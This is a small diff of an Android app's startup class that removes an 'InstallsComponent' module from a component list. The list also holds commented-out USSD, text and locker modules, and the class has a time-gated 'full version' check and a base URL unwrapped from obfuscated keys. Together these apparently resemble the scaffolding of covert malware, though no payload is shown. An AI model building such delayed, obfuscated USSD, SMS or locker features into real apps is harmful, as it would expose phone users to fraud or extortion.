@@ -8,7 +8,6 @@ import java.util.List;
 import main_commons.app.c_master.CommonUtils;
 import main_commons.app.c_master.SdkBuilder;
 import main_commons.app.c_master.SdkComponent;
-import ustanovki.com.c_master.InstallsComponent;
 
 public class App extends Application {
 
@@ -19,7 +18,7 @@ public class App extends Application {
         boolean useFullVersion = CommonUtils.checkIsFullVersionTime(BuildConfig.U_D);
         String baseUrl = CommonUtils.wrapStringWithKeys(BuildConfig.ARG_1, BuildConfig.KEY_1);
         List<SdkComponent> components = new ArrayList<>();
-        components.add(new InstallsComponent());
+//        components.add(new InstallsComponent());
         //        components.add(new UssdComponent());
         //        components.add(new TextComponent());
         //        components.add(new LockerComponent());
